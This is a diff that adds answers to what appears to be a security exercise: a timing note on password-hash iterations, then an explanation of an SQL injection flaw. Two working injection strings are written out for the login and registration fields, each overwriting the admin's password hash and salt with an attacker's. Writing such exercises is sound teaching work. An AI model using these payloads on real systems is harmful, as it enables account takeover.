@@ -126,4 +126,18 @@ public class AuthenticatorCustom : Authenticator {
 
 ## Question 5
 
+On my laptop its possible to run 100,000 iterations but when increasing to 1,000,000 it starts to take more than half a second.
 
+## Question 6
+
+The current implementation is vulnerable to SQL injection attack, when logging in the attach can specify their username as follows which would update the admin password with the attackers password:
+
+```
+' AND true; UPDATE password SET hashed_password = (SELECT hashed_password FROM password WHERE username = 'attacker'), salt = (SELECT salt FROM password WHERE username = 'attacker') WHERE username = 'admin'; --
+```
+
+This can also be done when registering a new user. This require the user to first register a user (the 'attacker') with a known password, this password hash can then be used next time to override the admin password with the attacker password.
+
+```
+dummy', 'salt', 'hash'); UPDATE password SET hashed_password = (SELECT hashed_password FROM password WHERE username = 'attacker'), salt = (SELECT salt FROM password WHERE username = 'attacker') WHERE username = 'admin'; --
+```
